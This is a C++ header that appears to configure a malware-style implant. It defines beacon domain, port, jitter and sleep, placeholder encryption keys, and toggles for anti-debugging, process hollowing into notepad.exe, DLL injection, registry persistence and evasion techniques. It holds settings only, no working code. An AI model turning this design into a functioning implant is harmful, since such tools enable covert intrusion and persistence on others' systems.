#ifndef AGENT_CONFIG_H
#define AGENT_CONFIG_H

#include <string>
#include <vector>

// Communication protocol configuration
const char* AGENT_PROTOCOL = "https"; // or "http"
const char* AGENT_DOMAIN = "example.com";
const int AGENT_PORT = 443; // or 80

// Logging configuration
#define AGENT_LOG_LEVEL DEBUG
#define AGENT_LOG_FILE "agent.log"
#define AGENT_LOG_SIZE 1024 * 1024 * 10 // 10MB

// Encryption configuration
const char* AGENT_ENCRYPTION_KEY = "my_secret_key";
const char* AGENT_ENCRYPTION_IV = "my_secret_iv";
const int AGENT_ENCRYPTION_METHOD = 1; // 1 = AES-256-CBC, 2 = RSA-2048

// Obfuscation configuration
#define AGENT_OBFUSCATION_LEVEL 2 // 1 = light, 2 = medium, 3 = heavy
const char* AGENT_OBFUSCATION_KEY = "my_obfuscation_key";

// Anti-debugging configuration
#define AGENT_ANTI_DEBUGGING 1 // 1 = enabled, 0 = disabled
const int AGENT_ANTI_DEBUGGING_METHOD = 1; // 1 = IsDebuggerPresent, 2 = CheckRemoteDebuggerPresent

// Process hollowing configuration
#define AGENT_PROCESS_HOLLOWING 1 // 1 = enabled, 0 = disabled
const char* AGENT_PROCESS_HOLLOWING_EXE = "notepad.exe";

// DLL injection configuration
#define AGENT_DLL_INJECTION 1 // 1 = enabled, 0 = disabled
const char* AGENT_DLL_INJECTION_DLL = "my_dll.dll";

// Network configuration
const char* AGENT_NETWORK_INTERFACE = "eth0"; // or "wlan0"
const int AGENT_NETWORK_PORT = 8080;

// Jittering configuration
#define AGENT_JITTERING 1 // 1 = enabled, 0 = disabled
const int AGENT_JITTERING_INTERVAL = 1000; // 1 second
const int AGENT_JITTERING_VARIANCE = 500; // 500ms

// Sleep configuration
#define AGENT_SLEEP 1 // 1 = enabled, 0 = disabled
const int AGENT_SLEEP_INTERVAL = 60000; // 1 minute
const int AGENT_SLEEP_VARIANCE = 30000; // 30 seconds

// Persistence configuration
#define AGENT_PERSISTENCE 1 // 1 = enabled, 0 = disabled
const char* AGENT_PERSISTENCE_REG_KEY = "HKCU\\Software\\MyCompany\\MyProduct";
const char* AGENT_PERSISTENCE_REG_VALUE = "MyValue";

// Evasion configuration
#define AGENT_EVASION 1 // 1 = enabled, 0 = disabled
const int AGENT_EVASION_METHOD = 1; // 1 = code caves, 2 = process doppelganging

#endif // AGENT_CONFIG_H